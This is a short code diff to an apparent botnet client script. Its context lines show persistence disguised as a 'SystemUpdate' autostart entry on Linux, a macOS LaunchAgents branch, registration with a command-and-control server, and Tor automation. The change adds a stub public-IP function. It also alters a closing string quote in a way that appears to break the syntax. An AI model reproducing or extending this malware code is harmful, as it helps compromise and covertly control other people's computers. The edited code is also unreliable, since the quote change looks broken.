@@ -272,7 +272,7 @@ NoDisplay=false
 X-GNOME-Autostart-enabled=true
 Name=SystemUpdate
 Comment=Auto-start script
-""")
+"""")
         debug("Persistence set up successfully on Linux.")
     elif system == "Darwin":  # macOS
         launch_agents = os.path.expanduser("~/Library/LaunchAgents")
@@ -486,6 +486,10 @@ def register_with_c2(ghost_comm_client):
     except Exception as e:
         logger.exception(f"An unexpected error occurred during registration. Error: {e}")
         return None
+
+def public_ip():
+    # This function needs to be implemented to get the public IP of the bot
+    return "127.0.0.1"
 
 if __name__ == '__main__':
     debug("Starting Tor Expert Bundle automation script...")
